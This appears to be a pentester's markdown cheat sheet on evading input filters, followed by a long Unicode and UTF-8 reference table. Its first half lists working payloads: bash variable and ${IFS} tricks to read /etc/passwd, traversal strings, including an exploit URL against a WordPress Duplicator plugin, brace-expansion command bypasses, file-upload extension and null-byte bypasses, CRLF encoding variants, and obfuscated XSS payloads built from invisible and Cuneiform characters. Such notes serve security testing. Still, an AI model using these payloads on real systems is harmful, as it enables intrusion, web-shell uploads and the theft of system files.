

### uninitialized bash variable 
in order to elude regular expression based filters and pattern match.
```
echo "uninitialized_variable=$uninitialized_variable"
```
Uninitialized variable has null value (no value at all).
```
uninitialized_variable=
```
Declaring, but not initializing it, it's the same as setting it to a null value, as above
```
cat$u /etc$u/passwd$u
```
Bash Variable Substitution ($u equal to "")
```
cat /etc/passwd
```


### directory traversal bypass
```
/e?c/pa??wd
/../../etc/passwd 
%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
cat$u+/etc$u/passwd$u
cat$qwerty /etc$lolololol/passwd$aaaaaaaaaa
```

https://twitter.com/faizalabroni/status/1361246813211172865
1. Found Wordpress target
2. try to find plugin and got WordPress Duplicator plugin
3. input /wp-admin/admin-ajax.php?action=duplicator_download&file=..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd 
4. You can also use nuclei for scanning this issue


### shell brace expansion filter bypass
```
echo "which -a curl" | echo "{$(tr -s " " ,)}"
echo "which -a curl" | ./msfvenom -p - -a cmd --platform unix -b " " -e cmd/brace
```
the response will be: {which,-a,curl}

this should bypass some restrictions

### alternate examples space filter evasion/bypass:
```
echo a.|{which,-a,curl}
echo |{which,-a,curl};#.a
cat${IFS}/etc/passwd
```

## Filter Evasion
The first step is to determine what the filters are allowing or blocking, and where they are implemented. If the restrictions are performed on the client-side using JavaScript, then they can be trivially bypassed with an intercepting proxy.

If the filtering is performed on the server-side, then various techniques can be attempted to bypass it, including:
1. Change the value of Content-Type as image/jpeg in HTTP request.
2. Change the extensions to a less common extension, such as: 
  ```
   file.php5 
   file.shtml 
   file.asa 
   file.jsp
   file.jspx 
   file.aspx 
   file.asp 
   file.phtml 
   file.cshtml
   ```
3. Change the capitalisation of the extension, such as: 
  ```
  file.PhP 
  file.AspX
  ```
4. If the request includes multiple file names, change them to different values.
5. Using special trailing characters such as spaces, dots or null characters such as: 
  ```
  file.asp...
  file.php;jpg 
  file.asp%00.jpg 
  1.jpg%00.php
  ```
6. In badly configured versions of nginx, uploading a file as test.jpg/x.php may allow it to be executed as x.php.



## if not able to upload the file type you like try adding extensions and/or special characters
https://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/

consider throwing hex or decimel in as well. 

```
maliciousfile.jpg.asp
Maliciousfile.asp;,jpg
```

## App blocks %0D%0A? we try %0A or %0D or %u2028 or %2029 (using correct encoding).

But also remember to try things like this especially if you are dealing with Java:
```
%C0%8D%C0%8A
%c4%8a
%EA%A8%8A
```




## Delimiters
|delimiters  | |
|------------|-|
|commas |,|
|semicolon |;|
|quotes | " ' |
|braces |{}|
|pipes | \| |
|slashes | / \ |


## invisible chars <3
https://twitter.com/flyink13/status/1338591071882850306?s=20
```
ﾠ='',ﾠ‌=!ﾠ+ﾠ,ﾠ‍=!ﾠ‌+ﾠ,ﾠ͏=ﾠ+{},ﾠ‌ﾠ=ﾠ‌[ﾠ++],
ﾠ‌‌=ﾠ‌[ﾠ‌‍=ﾠ],ﾠ‍ﾠ=++ﾠ‌‍+ﾠ,ﾠ‌͏=ﾠ͏[ﾠ‌‍+ﾠ‍ﾠ],ﾠ‌[ﾠ‌͏+=ﾠ͏[ﾠ]
+(ﾠ‌.ﾠ‍+ﾠ͏)[ﾠ]+ﾠ‍[ﾠ‍ﾠ]+ﾠ‌ﾠ+ﾠ‌‌+ﾠ‌[ﾠ‌‍]+ﾠ‌͏+ﾠ‌ﾠ+ﾠ͏[ﾠ]
+ﾠ‌‌][ﾠ‌͏](ﾠ‍[ﾠ]+ﾠ‍[ﾠ‌‍]+ﾠ‌[ﾠ‍ﾠ]+ﾠ‌‌+ﾠ‌ﾠ+"(ﾠ)")()
```

## ASCII Invisible Characters
https://stackoverflow.com/questions/17978720/invisible-characters-ascii
```
Number    Name                   HTML Code    Appearance
------    --------------------   ---------    ----------
U+0020    Space                  &#32             [ ]
U+00A0    No-Break Space         &#160	          [ ]
U+2000    En Quad                &#8192;          " "
U+2001    Em Quad                &#8193;          " "
U+2002    En Space               &#8194;          " "
U+2003    Em Space               &#8195;          " "
U+2004    Three-Per-Em Space     &#8196;          " "
U+2005    Four-Per-Em Space      &#8197;          " "
U+2006    Six-Per-Em Space       &#8198;          " "
U+2007    Figure Space           &#8199;          " "
U+2008    Punctuation Space      &#8200;          " "
U+2009    Thin Space             &#8201;          " "
U+200A    Hair Space             &#8202;          " "
U+200B    Zero-Width Space       &#8203;          "​"
U+200C    Zero Width Non-Joiner  &#8204;          "‌"
U+200D    Zero Width Joiner      &#8205;          "‍"
U+200E    Left-To-Right Mark     &#8206;          "‎"
U+200F    Right-To-Left Mark     &#8207;          "‏"
U+202F    Narrow No-Break Space  &#8239;          " "
U+2028    Line Separator	       &#8232           [ ]
U+205F    Medium Mathematical Space	 &#8287     [ ]
U+3000    Ideographic Space	      &#12288         [　]
```


## an XSS payload, Cuneiform-alphabet based
https://twitter.com/lutfumertceylan/status/1338494979199660032?s=20
```
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```


## Encodings of Unicode Character 'ZERO WIDTH NON-JOINER' (U+200C)


| Character Set	| Hex Byte(s) |
|---------------|-------------|
| CESU-8	| e2808c |
| GB18030	| 8136a438 |
| UTF-16	| feff200c |
| UTF-16BE	| 200c |
| UTF-16LE	| 0c20 |
| UTF-32	| 0000200c |
| UTF-32BE	| 0000200c |
| UTF-32LE	| 0c200000 |
| UTF-7	| 2b4941772d |
| UTF-7-OPTIONAL	| 2b4941772d |
| UTF-8	| e2808c |
| windows-1256	| 9d |
| x-ISCII91	| e8 |
| x-UTF-16LE-BOM	| fffe0c20 |
| X-UTF-32BE-BOM	| 0000feff0000200c |
| X-UTF-32LE-BOM	| fffe00000c200000 |


|Encodings||
|---------|-|
|HTML Entity (decimal)	| &#8204;|
|HTML Entity (hex)	| &#x200c;|
|HTML Entity (named)	| &zwnj;|
|How to type in Microsoft Windows	Alt | +200C|
|UTF-8 (hex)	| 0xE2 0x80 0x8C (e2808c)|
|UTF-8 (binary)	| 11100010:10000000:10001100|
|UTF-16 (hex)	| 0x200C (200c)|
|UTF-16 (decimal)	| 8,204|
|UTF-32 (hex)	| 0x0000200C (200c)|
|UTF-32 (decimal)	| 8,204|
|C/C++/Java source code	| "\u200C"|
|Python source code	| u"\u200C"|



Unicode Converter - Decimal, text, URL, and unicode converter
1. https://www.branah.com/unicode-converter
2. https://r12a.github.io/app-conversion/



































































| Unicode code point |	character	 | UTF-8 (hex.)	| name |
|--------------------|-------------|--------------|------|
|U+0000	| 	|00	|<control>|
|U+0001	| 	|01	|<control>|
|U+0002	| 	|02	|<control>|
|U+0003	| 	|03	|<control>|
|U+0004| 	|04	<control>
|U+0005| 	|05	<control>
|U+0006| 	|06	<control>
|U+0007| 	|07	<control>
|U+0008| 	|08	<control>
|U+0009| 	|09	<control>
|U+000A| 	|0a	<control>
|U+000B| 	|0b	<control>
|U+000C| 	|0c	<control>
|U+000D| 	|0d	<control>
|U+000E| 	|0e	<control>
|U+000F| 	|0f	<control>
|U+0010| 	|10	<control>
|U+0011| 	|11	<control>
|U+0012| 	|12	<control>
|U+0013| 	|13	<control>
|U+0014| 	|14	<control>
|U+0015| 	|15	<control>
|U+0016| 	|16	<control>
|U+0017| 	|17	<control>
|U+0018| 	|18	<control>
|U+0019| 	|19	<control>
|U+001A| 	|1a	<control>
|U+001B| 	|1b	<control>
|U+001C| 	|1c	<control>
|U+001D| 	|1d	<control>
|U+001E| 	|1e	<control>
|U+001F| 	|1f	<control>
|U+0020| 	|20	SPACE
|U+0021	!	21	EXCLAMATION MARK
|U+0022	"	22	QUOTATION MARK
|U+0023	#	23	NUMBER SIGN
|U+0024	$	24	DOLLAR SIGN
|U+0025	%	25	PERCENT SIGN
|U+0026	&	26	AMPERSAND
|U+0027	'	27	APOSTROPHE
|U+0028	(	28	LEFT PARENTHESIS
|U+0029	)	29	RIGHT PARENTHESIS
|U+002A	*	2a	ASTERISK
|U+002B	+	2b	PLUS SIGN
|U+002C	,	2c	COMMA
|U+002D	-	2d	HYPHEN-MINUS
|U+002E	.	2e	FULL STOP
|U+002F	/	2f	SOLIDUS
|U+0030	0	30	DIGIT ZERO
|U+0031	1	31	DIGIT ONE
|U+0032	2	32	DIGIT TWO
|U+0033	3	33	DIGIT THREE
|U+0034	4	34	DIGIT FOUR
|U+0035	5	35	DIGIT FIVE
|U+0036	6	36	DIGIT SIX
|U+0037	7	37	DIGIT SEVEN
|U+0038	8	38	DIGIT EIGHT
|U+0039	9	39	DIGIT NINE
|U+003A	:	3a	COLON
|U+003B	;	3b	SEMICOLON
|U+003C	<	3c	LESS-THAN SIGN
|U+003D	=	3d	EQUALS SIGN
|U+003E	>	3e	GREATER-THAN SIGN
|U+003F	?	3f	QUESTION MARK
|U+0040	@	40	COMMERCIAL AT
|U+0041|	A|	41|	LATIN CAPITAL LETTER A|
|U+0042	B	42	LATIN CAPITAL LETTER B
|U+0043	C	43	LATIN CAPITAL LETTER C
|U+0044	D	44	LATIN CAPITAL LETTER D
|U+0045	E	45	LATIN CAPITAL LETTER E
|U+0046	F	46	LATIN CAPITAL LETTER F
|U+0047	G	47	LATIN CAPITAL LETTER G
|U+0048	H	48	LATIN CAPITAL LETTER H
|U+0049	I	49	LATIN CAPITAL LETTER I
|U+004A	J	4a	LATIN CAPITAL LETTER J
|U+004B	K	4b	LATIN CAPITAL LETTER K
|U+004C	L	4c	LATIN CAPITAL LETTER L
|U+004D	M	4d	LATIN CAPITAL LETTER M
|U+004E	N	4e	LATIN CAPITAL LETTER N
|U+004F	O	4f	LATIN CAPITAL LETTER O
|U+0050	P	50	LATIN CAPITAL LETTER P
|U+0051	Q	51	LATIN CAPITAL LETTER Q
|U+0052	R	52	LATIN CAPITAL LETTER R
|U+0053	S	53	LATIN CAPITAL LETTER S
|U+0054	T	54	LATIN CAPITAL LETTER T
|U+0055	U	55	LATIN CAPITAL LETTER U
|U+0056	V	56	LATIN CAPITAL LETTER V
|U+0057	W	57	LATIN CAPITAL LETTER W
|U+0058	X	58	LATIN CAPITAL LETTER X
|U+0059	Y	59	LATIN CAPITAL LETTER Y
|U+005A	Z	5a	LATIN CAPITAL LETTER Z
|U+005B	[	5b	LEFT SQUARE BRACKET
|U+005C	\	5c	REVERSE SOLIDUS
|U+005D	]	5d	RIGHT SQUARE BRACKET
|U+005E	^	5e	CIRCUMFLEX ACCENT
|U+005F	_	5f	LOW LINE
|U+0060	`	60	GRAVE ACCENT
|U+0061	a	61	LATIN SMALL LETTER A
|U+0062	b	62	LATIN SMALL LETTER B
|U+0063	c	63	LATIN SMALL LETTER C
|U+0064	d	64	LATIN SMALL LETTER D
|U+0065	e	65	LATIN SMALL LETTER E
|U+0066	f	66	LATIN SMALL LETTER F
|U+0067	g	67	LATIN SMALL LETTER G
|U+0068	h	68	LATIN SMALL LETTER H
|U+0069	i	69	LATIN SMALL LETTER I
|U+006A	j	6a	LATIN SMALL LETTER J
|U+006B	k	6b	LATIN SMALL LETTER K
|U+006C	l	6c	LATIN SMALL LETTER L
|U+006D	m	6d	LATIN SMALL LETTER M
|U+006E	n	6e	LATIN SMALL LETTER N
|U+006F	o	6f	LATIN SMALL LETTER O
|U+0070	p	70	LATIN SMALL LETTER P
|U+0071	q	71	LATIN SMALL LETTER Q
|U+0072	r	72	LATIN SMALL LETTER R
|U+0073	s	73	LATIN SMALL LETTER S
|U+0074	t	74	LATIN SMALL LETTER T
|U+0075	u	75	LATIN SMALL LETTER U
|U+0076	v	76	LATIN SMALL LETTER V
|U+0077	w	77	LATIN SMALL LETTER W
|U+0078	x	78	LATIN SMALL LETTER X
|U+0079	y	79	LATIN SMALL LETTER Y
|U+007A	z	7a	LATIN SMALL LETTER Z
|U+007B	{	7b	LEFT CURLY BRACKET
|U+007C	|	7c	VERTICAL LINE
|U+007D	}	7d	RIGHT CURLY BRACKET
|U+007E	~	7e	TILDE
|U+007F|	 |	7f|	<control>|
|U+0080|	 	|c2 80|	<control>|
|U+0081|	 	|c2 81|	<control>|
|U+0082	 	c2 82	<control>
|U+0083	 	c2 83	<control>
|U+0084	 	c2 84	<control>
|U+0085	 	c2 85	<control>
|U+0086	 	c2 86	<control>
|U+0087	 	c2 87	<control>
|U+0088	 	c2 88	<control>
|U+0089	 	c2 89	<control>
|U+008A	 	c2 8a	<control>
|U+008B	 	c2 8b	<control>
|U+008C	 	c2 8c	<control>
|U+008D	 	c2 8d	<control>
|U+008E	 	c2 8e	<control>
|U+008F	 	c2 8f	<control>
|U+0090	 	c2 90	<control>
|U+0091	 	c2 91	<control>
|U+0092	 	c2 92	<control>
|U+0093	 	c2 93	<control>
|U+0094	 	c2 94	<control>
|U+0095	 	c2 95	<control>
|U+0096	 	c2 96	<control>
|U+0097	 	c2 97	<control>
|U+0098	 	c2 98	<control>
|U+0099	 	c2 99	<control>
|U+009A	 	c2 9a	<control>
|U+009B	 	c2 9b	<control>
|U+009C	 	c2 9c	<control>
|U+009D	 	c2 9d	<control>
|U+009E	 	c2 9e	<control>
|U+009F	 	c2 9f	<control>
|U+00A0	 	c2 a0	NO-BREAK SPACE
U+00A1	¡	c2 a1	INVERTED EXCLAMATION MARK
U+00A2	¢	c2 a2	CENT SIGN
U+00A3	£	c2 a3	POUND SIGN
U+00A4	¤	c2 a4	CURRENCY SIGN
U+00A5	¥	c2 a5	YEN SIGN
U+00A6	¦	c2 a6	BROKEN BAR
U+00A7	§	c2 a7	SECTION SIGN
U+00A8	¨	c2 a8	DIAERESIS
U+00A9	©	c2 a9	COPYRIGHT SIGN
U+00AA	ª	c2 aa	FEMININE ORDINAL INDICATOR
U+00AB	«	c2 ab	LEFT-POINTING DOUBLE ANGLE QUOTATION MARK
U+00AC	¬	c2 ac	NOT SIGN
U+00AD	­	c2 ad	SOFT HYPHEN
U+00AE	®	c2 ae	REGISTERED SIGN
U+00AF	¯	c2 af	MACRON
U+00B0	°	c2 b0	DEGREE SIGN
U+00B1	±	c2 b1	PLUS-MINUS SIGN
U+00B2	²	c2 b2	SUPERSCRIPT TWO
U+00B3	³	c2 b3	SUPERSCRIPT THREE
U+00B4	´	c2 b4	ACUTE ACCENT
U+00B5	µ	c2 b5	MICRO SIGN
U+00B6	¶	c2 b6	PILCROW SIGN
U+00B7	·	c2 b7	MIDDLE DOT
U+00B8	¸	c2 b8	CEDILLA
U+00B9	¹	c2 b9	SUPERSCRIPT ONE
U+00BA	º	c2 ba	MASCULINE ORDINAL INDICATOR
U+00BB	»	c2 bb	RIGHT-POINTING DOUBLE ANGLE QUOTATION MARK
U+00BC	¼	c2 bc	VULGAR FRACTION ONE QUARTER
U+00BD	½	c2 bd	VULGAR FRACTION ONE HALF
U+00BE	¾	c2 be	VULGAR FRACTION THREE QUARTERS
U+00BF	¿	c2 bf	INVERTED QUESTION MARK
U+00C0	À	c3 80	LATIN CAPITAL LETTER A WITH GRAVE
U+00C1	Á	c3 81	LATIN CAPITAL LETTER A WITH ACUTE
U+00C2	Â	c3 82	LATIN CAPITAL LETTER A WITH CIRCUMFLEX
U+00C3	Ã	c3 83	LATIN CAPITAL LETTER A WITH TILDE
U+00C4	Ä	c3 84	LATIN CAPITAL LETTER A WITH DIAERESIS
U+00C5	Å	c3 85	LATIN CAPITAL LETTER A WITH RING ABOVE
U+00C6	Æ	c3 86	LATIN CAPITAL LETTER AE
U+00C7	Ç	c3 87	LATIN CAPITAL LETTER C WITH CEDILLA
U+00C8	È	c3 88	LATIN CAPITAL LETTER E WITH GRAVE
U+00C9	É	c3 89	LATIN CAPITAL LETTER E WITH ACUTE
U+00CA	Ê	c3 8a	LATIN CAPITAL LETTER E WITH CIRCUMFLEX
U+00CB	Ë	c3 8b	LATIN CAPITAL LETTER E WITH DIAERESIS
U+00CC	Ì	c3 8c	LATIN CAPITAL LETTER I WITH GRAVE
U+00CD	Í	c3 8d	LATIN CAPITAL LETTER I WITH ACUTE
U+00CE	Î	c3 8e	LATIN CAPITAL LETTER I WITH CIRCUMFLEX
U+00CF	Ï	c3 8f	LATIN CAPITAL LETTER I WITH DIAERESIS
U+00D0	Ð	c3 90	LATIN CAPITAL LETTER ETH
U+00D1	Ñ	c3 91	LATIN CAPITAL LETTER N WITH TILDE
U+00D2	Ò	c3 92	LATIN CAPITAL LETTER O WITH GRAVE
U+00D3	Ó	c3 93	LATIN CAPITAL LETTER O WITH ACUTE
U+00D4	Ô	c3 94	LATIN CAPITAL LETTER O WITH CIRCUMFLEX
U+00D5	Õ	c3 95	LATIN CAPITAL LETTER O WITH TILDE
U+00D6	Ö	c3 96	LATIN CAPITAL LETTER O WITH DIAERESIS
U+00D7	×	c3 97	MULTIPLICATION SIGN
U+00D8	Ø	c3 98	LATIN CAPITAL LETTER O WITH STROKE
U+00D9	Ù	c3 99	LATIN CAPITAL LETTER U WITH GRAVE
U+00DA	Ú	c3 9a	LATIN CAPITAL LETTER U WITH ACUTE
U+00DB	Û	c3 9b	LATIN CAPITAL LETTER U WITH CIRCUMFLEX
U+00DC	Ü	c3 9c	LATIN CAPITAL LETTER U WITH DIAERESIS
U+00DD	Ý	c3 9d	LATIN CAPITAL LETTER Y WITH ACUTE
U+00DE	Þ	c3 9e	LATIN CAPITAL LETTER THORN
U+00DF	ß	c3 9f	LATIN SMALL LETTER SHARP S
U+00E0	à	c3 a0	LATIN SMALL LETTER A WITH GRAVE
U+00E1	á	c3 a1	LATIN SMALL LETTER A WITH ACUTE
U+00E2	â	c3 a2	LATIN SMALL LETTER A WITH CIRCUMFLEX
U+00E3	ã	c3 a3	LATIN SMALL LETTER A WITH TILDE
U+00E4	ä	c3 a4	LATIN SMALL LETTER A WITH DIAERESIS
U+00E5	å	c3 a5	LATIN SMALL LETTER A WITH RING ABOVE
U+00E6	æ	c3 a6	LATIN SMALL LETTER AE
U+00E7	ç	c3 a7	LATIN SMALL LETTER C WITH CEDILLA
U+00E8	è	c3 a8	LATIN SMALL LETTER E WITH GRAVE
U+00E9	é	c3 a9	LATIN SMALL LETTER E WITH ACUTE
U+00EA	ê	c3 aa	LATIN SMALL LETTER E WITH CIRCUMFLEX
U+00EB	ë	c3 ab	LATIN SMALL LETTER E WITH DIAERESIS
U+00EC	ì	c3 ac	LATIN SMALL LETTER I WITH GRAVE
U+00ED	í	c3 ad	LATIN SMALL LETTER I WITH ACUTE
U+00EE	î	c3 ae	LATIN SMALL LETTER I WITH CIRCUMFLEX
U+00EF	ï	c3 af	LATIN SMALL LETTER I WITH DIAERESIS
U+00F0	ð	c3 b0	LATIN SMALL LETTER ETH
U+00F1	ñ	c3 b1	LATIN SMALL LETTER N WITH TILDE
U+00F2	ò	c3 b2	LATIN SMALL LETTER O WITH GRAVE
U+00F3	ó	c3 b3	LATIN SMALL LETTER O WITH ACUTE
U+00F4	ô	c3 b4	LATIN SMALL LETTER O WITH CIRCUMFLEX
U+00F5	õ	c3 b5	LATIN SMALL LETTER O WITH TILDE
U+00F6	ö	c3 b6	LATIN SMALL LETTER O WITH DIAERESIS
U+00F7	÷	c3 b7	DIVISION SIGN
U+00F8	ø	c3 b8	LATIN SMALL LETTER O WITH STROKE
U+00F9	ù	c3 b9	LATIN SMALL LETTER U WITH GRAVE
U+00FA	ú	c3 ba	LATIN SMALL LETTER U WITH ACUTE
U+00FB	û	c3 bb	LATIN SMALL LETTER U WITH CIRCUMFLEX
U+00FC	ü	c3 bc	LATIN SMALL LETTER U WITH DIAERESIS
U+00FD	ý	c3 bd	LATIN SMALL LETTER Y WITH ACUTE
U+00FE	þ	c3 be	LATIN SMALL LETTER THORN
U+00FF	ÿ	c3 bf	LATIN SMALL LETTER Y WITH DIAERESIS

